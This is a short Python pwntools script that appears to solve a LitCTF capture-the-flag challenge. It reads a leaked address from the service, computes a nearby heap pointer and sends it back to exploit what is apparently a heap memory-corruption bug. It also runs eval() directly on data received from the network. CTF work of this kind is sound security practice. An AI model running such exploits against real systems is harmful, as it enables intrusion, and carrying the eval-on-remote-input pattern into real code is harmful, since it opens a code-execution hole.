from pwn import *

io = remote('litctf.org', 31772)
io = process('./s_patched')

leak = eval(io.recvline().decode())
next_free_address = leak - 80 + 8
io.sendline(f'{next_free_address}'.encode())
io.sendline('anything'.encode())
print(io.recvallS())
